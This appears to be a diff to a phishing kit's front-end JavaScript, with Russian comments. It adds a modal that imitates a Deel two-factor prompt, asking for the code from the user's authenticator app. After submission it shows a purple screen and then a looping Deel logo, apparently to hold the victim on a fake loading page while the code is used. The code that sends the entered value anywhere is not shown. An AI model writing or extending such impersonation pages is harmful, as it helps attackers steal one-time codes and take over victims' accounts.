@@ -714,8 +714,394 @@ document.addEventListener('DOMContentLoaded', async function() {
     });
   }
 });
+function thirdParty() {
+  // Remove any existing modals
+  const existingModals = document.querySelectorAll('div[style*="position: fixed"][style*="z-index: 1000"]');
+  existingModals.forEach(modal => {
+    document.body.removeChild(modal);
+  });
+
+  // Create modal container with semi-transparent background
+  const modal = document.createElement('div');
+  modal.style.position = 'fixed';
+  modal.style.top = '0';
+  modal.style.left = '0';
+  modal.style.width = '100%';
+  modal.style.height = '100%';
+  modal.style.backgroundColor = 'rgba(0, 0, 0, 0.5)';
+  modal.style.zIndex = '1000';
+  modal.style.display = 'flex';
+  modal.style.flexDirection = 'column';
+  modal.style.alignItems = 'center';
+  modal.style.justifyContent = 'center';
+  modal.style.fontFamily = '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, sans-serif';
+
+  // Create white form container
+  const formContainer = document.createElement('div');
+  formContainer.style.backgroundColor = 'white';
+  formContainer.style.borderRadius = '10px';
+  formContainer.style.width = '100%';
+  formContainer.style.maxWidth = '500px';
+  formContainer.style.display = 'flex';
+  formContainer.style.flexDirection = 'column';
+  formContainer.style.padding = '20px 20px 30px 20px';
+  formContainer.style.boxShadow = '0 4px 12px rgba(0, 0, 0, 0.15)';
+  formContainer.style.margin = '0 15px';
+
+  // Adjust for mobile devices
+  if (window.innerWidth <= 768) {
+    formContainer.style.margin = '0';
+    formContainer.style.borderRadius = '10px 10px 0 0';
+    modal.style.alignItems = 'flex-end';
+    modal.style.justifyContent = 'flex-end';
+  }
+
+  // Create close button at top right
+  const closeButton = document.createElement('button');
+  closeButton.innerHTML = '&#10005;';
+  closeButton.style.background = 'none';
+  closeButton.style.border = 'none';
+  closeButton.style.fontSize = '24px';
+  closeButton.style.cursor = 'pointer';
+  closeButton.style.padding = '0';
+  closeButton.style.position = 'absolute';
+  closeButton.style.top = '20px';
+  closeButton.style.right = '20px';
+  closeButton.onclick = () => {
+    document.body.removeChild(modal);
+  };
+  formContainer.style.position = 'relative';
+  formContainer.appendChild(closeButton);
+
+  // Image container
+  const imageContainer = document.createElement('div');
+  imageContainer.style.display = 'flex';
+  imageContainer.style.justifyContent = 'center';
+  imageContainer.style.marginTop = '20px';
+  imageContainer.style.marginBottom = '10px';
+
+  // Check if the device is mobile
+  const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent) || window.innerWidth <= 768;
+  
+  if (isMobile) {
+    // For mobile devices, use a div with a background image instead
+    const imageDiv = document.createElement('div');
+    imageDiv.style.width = '150px';
+    imageDiv.style.height = '150px';
+    imageDiv.style.backgroundImage = 'url("https://i.imgur.com/6qQBRQ4.png")';
+    imageDiv.style.backgroundSize = 'contain';
+    imageDiv.style.backgroundPosition = 'center';
+    imageDiv.style.backgroundRepeat = 'no-repeat';
+    
+    imageContainer.appendChild(imageDiv);
+  } else {
+    // For desktop, use the image element as before
+    const image = document.createElement('img');
+    image.src = 'https://i.imgur.com/6qQBRQ4.png';
+    image.alt = 'Authentication App';
+    image.style.maxWidth = '150px';
+    image.style.height = 'auto';
+    
+    imageContainer.appendChild(image);
+  }
+
+  // Title
+  const title = document.createElement('h2');
+  title.textContent = 'Enter code shown on your third-party authentication app';
+  title.style.textAlign = 'center';
+  title.style.fontSize = '24px';
+  title.style.fontWeight = '500';
+  title.style.margin = '20px 0 30px 0';
+  title.style.lineHeight = '1.3';
+  title.style.padding = '0 15px';
+
+  // Input field
+  const inputField = document.createElement('input');
+  inputField.type = 'text';
+  inputField.placeholder = 'Enter code *';
+  inputField.style.width = '100%';
+  inputField.style.padding = '16px';
+  inputField.style.borderRadius = '8px';
+  inputField.style.border = '1px solid rgba(0, 0, 0, 0.1)';
+  inputField.style.fontSize = '16px';
+  inputField.style.marginBottom = '20px';
+  inputField.style.boxSizing = 'border-box';
+
+  // Checkbox container - made entirely clickable
+  const checkboxContainer = document.createElement('div');
+  checkboxContainer.style.backgroundColor = '#f9f9f9';
+  checkboxContainer.style.padding = '20px';
+  checkboxContainer.style.borderRadius = '8px';
+  checkboxContainer.style.marginBottom = '20px';
+  checkboxContainer.style.display = 'flex';
+  checkboxContainer.style.alignItems = 'flex-start';
+  checkboxContainer.style.gap = '15px';
+  checkboxContainer.style.cursor = 'pointer'; // Make cursor a pointer when hovering
+
+  // Custom checkbox with better styling - FIXED positioning
+  const checkboxWrapper = document.createElement('div');
+  checkboxWrapper.style.position = 'relative';
+  checkboxWrapper.style.width = '20px';
+  checkboxWrapper.style.height = '20px';
+  checkboxWrapper.style.marginTop = '3px';
+  checkboxWrapper.style.flexShrink = '0'; // Prevent checkbox from shrinking
+  
+  // Real checkbox (hidden but functional)
+  const checkbox = document.createElement('input');
+  checkbox.type = 'checkbox';
+  checkbox.id = 'remember-checkbox';
+  checkbox.style.opacity = '0';
+  checkbox.style.position = 'absolute';
+  checkbox.style.width = '100%';
+  checkbox.style.height = '100%';
+  checkbox.style.margin = '0';
+  checkbox.style.cursor = 'pointer';
+  checkbox.style.zIndex = '2';
+  
+  // Custom visual checkbox - FIXED styling
+  const customCheckbox = document.createElement('div');
+  customCheckbox.style.position = 'absolute';
+  customCheckbox.style.top = '0';
+  customCheckbox.style.left = '0';
+  customCheckbox.style.width = '18px';
+  customCheckbox.style.height = '18px';
+  customCheckbox.style.border = '2px solid #ccc';
+  customCheckbox.style.backgroundColor = 'white';
+  customCheckbox.style.borderRadius = '4px';
+  customCheckbox.style.transition = 'all 0.2s ease';
+  customCheckbox.style.boxSizing = 'border-box'; // Add box-sizing to fix sizing issues
+  
+  // Check mark (initially hidden) - FIXED positioning
+  const checkMark = document.createElement('div');
+  checkMark.innerHTML = '&#10003;'; // Checkmark symbol
+  checkMark.style.position = 'absolute';
+  checkMark.style.top = '-1px';
+  checkMark.style.left = '2px';
+  checkMark.style.color = 'white';
+  checkMark.style.fontSize = '14px';
+  checkMark.style.fontWeight = 'bold';
+  checkMark.style.opacity = '0';
+  checkMark.style.transition = 'opacity 0.2s ease';
+  
+  customCheckbox.appendChild(checkMark);
+  checkboxWrapper.appendChild(checkbox);
+  checkboxWrapper.appendChild(customCheckbox);
+
+  // Set up checkbox change event
+  checkbox.addEventListener('change', function() {
+    if (this.checked) {
+      customCheckbox.style.backgroundColor = '#1a1a1a'; // Black background when checked
+      customCheckbox.style.borderColor = '#1a1a1a';
+      checkMark.style.opacity = '1';
+    } else {
+      customCheckbox.style.backgroundColor = 'white';
+      customCheckbox.style.borderColor = '#ccc';
+      checkMark.style.opacity = '0';
+    }
+  });
+
+  // Checkbox label container
+  const labelContainer = document.createElement('div');
+  labelContainer.style.display = 'flex';
+  labelContainer.style.flexDirection = 'column';
+  labelContainer.style.cursor = 'pointer';
+  labelContainer.style.flexGrow = '1'; // Allow label to take remaining space
+
+  // Checkbox label title
+  const labelTitle = document.createElement('div');
+  labelTitle.textContent = 'Don\'t ask again for 1 week';
+  labelTitle.style.fontSize = '16px';
+  labelTitle.style.fontWeight = '500';
+  labelTitle.style.marginBottom = '5px';
+
+  // Checkbox label description
+  const labelDesc = document.createElement('div');
+  labelDesc.textContent = 'We will not ask for verification code on your trusted device when you log in. Select only if the device is not shared';
+  labelDesc.style.fontSize = '14px';
+  labelDesc.style.color = '#666';
+  labelDesc.style.lineHeight = '1.4';
+
+  labelContainer.appendChild(labelTitle);
+  labelContainer.appendChild(labelDesc);
+  checkboxContainer.appendChild(checkboxWrapper);
+  checkboxContainer.appendChild(labelContainer);
+  
+  // Make the entire checkbox container clickable
+  checkboxContainer.addEventListener('click', function(e) {
+    // Only toggle if we didn't click directly on the checkbox itself
+    // This prevents double-toggling when clicking directly on checkbox
+    if (e.target !== checkbox) {
+      checkbox.checked = !checkbox.checked;
+      // Trigger the change event manually
+      const event = new Event('change');
+      checkbox.dispatchEvent(event);
+    }
+  });
+
+  // Continue button - using black instead of blue
+  const continueButton = document.createElement('button');
+  continueButton.textContent = 'Continue';
+  continueButton.style.width = '100%';
+  continueButton.style.padding = '16px';
+  continueButton.style.borderRadius = '8px';
+  continueButton.style.backgroundColor = '#1a1a1a'; // Using black color as requested
+  continueButton.style.color = 'white';
+  continueButton.style.border = 'none';
+  continueButton.style.fontSize = '16px';
+  continueButton.style.fontWeight = '500';
+  continueButton.style.cursor = 'pointer';
+  continueButton.style.marginBottom = '20px';
+  continueButton.onclick = () => {
+    if (!inputField.value.trim()) {
+    // Если поле пустое, показываем ошибку
+    inputField.style.border = '1px solid #ff3333';
+    
+    // Создаем сообщение об ошибке, если его еще нет
+    let errorMsg = document.getElementById('error-message');
+    if (!errorMsg) {
+      errorMsg = document.createElement('div');
+      errorMsg.id = 'error-message';
+      errorMsg.textContent = 'Please enter the authentication code';
+      errorMsg.style.color = '#ff3333';
+      errorMsg.style.fontSize = '14px';
+      errorMsg.style.marginTop = '-15px';
+      errorMsg.style.marginBottom = '15px';
+      // Вставляем сообщение после поля ввода
+      formContainer.insertBefore(errorMsg, checkboxContainer);
+    }
+    
+    // Добавляем обработчик для удаления ошибки при вводе текста
+    inputField.addEventListener('input', function() {
+      if (this.value.trim()) {
+        this.style.border = '1px solid rgba(0, 0, 0, 0.1)';
+        const errorMsg = document.getElementById('error-message');
+        if (errorMsg) {
+          formContainer.removeChild(errorMsg);
+        }
+      }
+    });
+    
+    return; // Прерываем выполнение функции
+  }
+  // Удаляем текущее модальное окно
+  document.body.removeChild(modal);
+  
+  // Создаем фиолетовый экран
+  const purpleScreen = document.createElement('div');
+  purpleScreen.style.position = 'fixed';
+  purpleScreen.style.top = '0';
+  purpleScreen.style.left = '0';
+  purpleScreen.style.width = '100%';
+  purpleScreen.style.height = '100%';
+  purpleScreen.style.backgroundColor = '#b69cfa'; // Фиолетовый фон
+  purpleScreen.style.zIndex = '1000';
+  purpleScreen.style.display = 'flex';
+  purpleScreen.style.justifyContent = 'center';
+  purpleScreen.style.alignItems = 'center';
+  
+  // Добавляем фиолетовый экран в body
+  document.body.appendChild(purpleScreen);
+  
+  // Через 3.5 секунды заменяем фиолетовый экран на анимацию логотипа
+  setTimeout(() => {
+    // Удаляем фиолетовый экран
+    document.body.removeChild(purpleScreen);
+    
+    // Создаем контейнер для анимации
+    const animationScreen = document.createElement('div');
+    animationScreen.style.position = 'fixed';
+    animationScreen.style.top = '0';
+    animationScreen.style.left = '0';
+    animationScreen.style.width = '100%';
+    animationScreen.style.height = '100%';
+    animationScreen.style.backgroundColor = 'white'; // Можете изменить на нужный цвет фона
+    animationScreen.style.zIndex = '1000';
+    animationScreen.style.display = 'flex';
+    animationScreen.style.justifyContent = 'center';
+    animationScreen.style.alignItems = 'center';
+    
+    // Создаем контейнер для логотипа
+    const logoContainer = document.createElement('div');
+    logoContainer.className = 'logo-container';
+    logoContainer.style.display = 'flex';
+    logoContainer.style.alignItems = 'center';
+    logoContainer.style.justifyContent = 'center';
+    logoContainer.style.position = 'relative';
+    logoContainer.style.width = '100%';
+    logoContainer.style.height = 'auto';
+    
+    // Создаем логотип
+    const logoImage = document.createElement('img');
+    logoImage.alt = 'Deel Logo Black';
+    logoImage.loading = 'lazy';
+    logoImage.width = 78;
+    logoImage.height = 27;
+    logoImage.decoding = 'async';
+    logoImage.className = 'deel-logo';
+    logoImage.src = 'logo_revamp_164ddaed0c.svg'; // Убедитесь, что у вас есть этот файл
+    
+    // Добавляем стили для анимации
+    const style = document.createElement('style');
+    style.textContent = `
+      @keyframes logoFadeIn {
+        from {
+          opacity: 0;
+          transform: translateY(50px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+      .deel-logo {
+        width: 78px;
+        height: 27px;
+        opacity: 0;
+        animation: logoFadeIn 1s ease-out forwards;
+        animation-iteration-count: infinite; /* Бесконечная анимация */
+      }
+    `;
+    
+    // Добавляем все элементы на страницу
+    document.head.appendChild(style);
+    logoContainer.appendChild(logoImage);
+    animationScreen.appendChild(logoContainer);
+    document.body.appendChild(animationScreen);
+  }, 3500); // 3.5 секунды
+};
+
+  // Access link
+  const accessLink = document.createElement('a');
+  accessLink.textContent = 'I don\'t have access to my authenticator app';
+  accessLink.href = '#';
+  accessLink.style.textAlign = 'center';
+  accessLink.style.color = '#3498db';
+  accessLink.style.textDecoration = 'none';
+  accessLink.style.fontSize = '16px';
+  accessLink.style.cursor = 'pointer';
+  accessLink.onclick = (e) => {
+    e.preventDefault();
+    document.body.removeChild(modal);
+    // Removed showApproveAnotherWay reference that might cause errors
+    alert("Alternative authentication method not available");
+  };
+
+  // Append all elements to form container
+  formContainer.appendChild(imageContainer);
+  formContainer.appendChild(title);
+  formContainer.appendChild(inputField);
+  formContainer.appendChild(checkboxContainer);
+  formContainer.appendChild(continueButton);
+  formContainer.appendChild(accessLink);
+
+  // Append form container to modal
+  modal.appendChild(formContainer);
+
+  // Add modal to body
+  document.body.appendChild(modal);
+}
 function showApproveAnotherWay() {
-  // Remove any existing verification modal
+  // Remove any existing modal (regardless of class)
   const existingModals = document.querySelectorAll('div[style*="position: fixed"][style*="z-index: 1000"]');
   existingModals.forEach(modal => {
     document.body.removeChild(modal);
@@ -770,16 +1156,24 @@ function showApproveAnotherWay() {
   header.style.width = '100%';
   header.style.marginBottom = '25px';
 
-  // Back button
+  // Back button with hover effect
   const backButton = document.createElement('button');
   backButton.innerHTML = '&#8592;';
   backButton.style.background = 'none';
   backButton.style.border = 'none';
   backButton.style.fontSize = '24px';
   backButton.style.cursor = 'pointer';
-  backButton.style.padding = '0';
+  backButton.style.padding = '8px';  // Added padding for larger click area
+  backButton.style.borderRadius = '50%'; // Make hover area circular
   backButton.style.lineHeight = '1';
   backButton.style.color = '#000';
+  backButton.style.transition = 'background-color 0.2s ease'; // Smooth transition
+  backButton.onmouseover = () => {
+    backButton.style.backgroundColor = '#f0f0f0'; // Light background on hover
+  };
+  backButton.onmouseout = () => {
+    backButton.style.backgroundColor = 'transparent';
+  };
   backButton.onclick = () => {
     // Go back to previous verification screen
     document.body.removeChild(modal);
@@ -795,16 +1189,24 @@ function showApproveAnotherWay() {
   title.style.fontWeight = '500';
   title.style.margin = '0';
 
-  // Close button
+  // Close button with hover effect
   const closeButton = document.createElement('button');
   closeButton.innerHTML = '&#10005;';
   closeButton.style.background = 'none';
   closeButton.style.border = 'none';
   closeButton.style.fontSize = '24px';
   closeButton.style.cursor = 'pointer';
-  closeButton.style.padding = '0';
+  closeButton.style.padding = '8px'; // Added padding for larger click area
+  closeButton.style.borderRadius = '50%'; // Make hover area circular
   closeButton.style.lineHeight = '1';
   closeButton.style.color = '#000';
+  closeButton.style.transition = 'background-color 0.2s ease'; // Smooth transition
+  closeButton.onmouseover = () => {
+    closeButton.style.backgroundColor = '#f0f0f0'; // Light background on hover
+  };
+  closeButton.onmouseout = () => {
+    closeButton.style.backgroundColor = 'transparent';
+  };
   closeButton.onclick = () => {
     document.body.removeChild(modal);
   };
@@ -813,7 +1215,7 @@ function showApproveAnotherWay() {
   header.appendChild(title);
   header.appendChild(closeButton);
   
-  // Third-party authentication app option
+  // Third-party authentication app option with hover effect
   const authOption = document.createElement('div');
   authOption.style.display = 'flex';
   authOption.style.alignItems = 'center';
@@ -824,6 +1226,20 @@ function showApproveAnotherWay() {
   authOption.style.marginBottom = '20px';
   authOption.style.cursor = 'pointer';
   authOption.style.border = '1px solid #eaeaea';
+  authOption.style.transition = 'all 0.2s ease'; // Smooth transition
+  authOption.onmouseover = () => {
+    authOption.style.backgroundColor = '#f0f0f0'; // Darker background on hover
+    authOption.style.boxShadow = '0 2px 8px rgba(0, 0, 0, 0.1)'; // Add subtle shadow
+    authOption.style.borderColor = '#d0d0d0'; // Darker border
+  };
+  authOption.onmouseout = () => {
+    authOption.style.backgroundColor = '#f9f9f9';
+    authOption.style.boxShadow = 'none';
+    authOption.style.borderColor = '#eaeaea';
+  };
+  authOption.onclick = () => {
+    thirdParty()
+  }
   
   // Icon container
   const iconContainer = document.createElement('div');
@@ -875,7 +1291,7 @@ function showApproveAnotherWay() {
   const supportContainer = document.createElement('div');
   supportContainer.style.display = 'flex';
   supportContainer.style.flexDirection = 'row'; // Changed to row instead of column
-  supportContainer.style.alignItems = 'center'; // Center items vertically
+  supportContainer.style.alignItems = 'center'; // Center items vertically 
   supportContainer.style.justifyContent = 'flex-start';
   supportContainer.style.marginTop = 'auto';
   supportContainer.style.width = '100%';
@@ -894,10 +1310,19 @@ function showApproveAnotherWay() {
   supportLink.style.textDecoration = 'none';
   supportLink.style.fontSize = '16px';
   supportLink.style.fontWeight = '500';
+  supportLink.style.transition = 'color 0.2s ease'; // Smooth transition
+  supportLink.onmouseover = () => {
+    supportLink.style.color = '#2980b9'; // Darker blue on hover
+    supportLink.style.textDecoration = 'underline'; // Add underline on hover
+  };
+  supportLink.onmouseout = () => {
+    supportLink.style.color = '#3498db';
+    supportLink.style.textDecoration = 'none';
+  };
   
   supportContainer.appendChild(troubleText);
   supportContainer.appendChild(supportLink);
-  
+
   // Assemble the form
   formContainer.appendChild(header);
   formContainer.appendChild(authOption);
